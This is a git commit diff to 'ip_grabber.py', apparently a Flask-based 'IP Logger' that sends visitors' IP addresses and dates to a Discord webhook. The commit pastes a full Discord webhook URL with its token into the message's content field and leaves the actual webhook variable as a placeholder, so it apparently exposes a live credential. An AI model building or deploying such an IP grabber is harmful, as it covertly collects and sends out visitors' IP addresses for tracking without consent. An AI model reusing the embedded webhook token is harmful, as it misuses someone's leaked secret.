1a3a0c16279f9ed32c5598cd37b952dc61995b8a
Mohamed Zaher <cfdhoi@gmail.com>
2025-07-01 21:26:04 +0300

    Update ip_grabber.py

--- ip_grabber.py
+++ ip_grabber.py
@@ -8,7 +8,7 @@ app = Flask(__name__)
 def send_ip(ip, date):
     webhook_url = "WEBHOOK_URL_HERE"
     data = {
-        "content": "",
+        "content": "https://discord.com/api/webhooks/1389671364117397594/jQhf499StnTMzV3J0s2suuI3_S6D7eHi40UNWJx4dY5eC8oSHUke0657sXN7cWB6Vmnr",
         "title": "IP Logger"
     }
     data["embeds"] = [
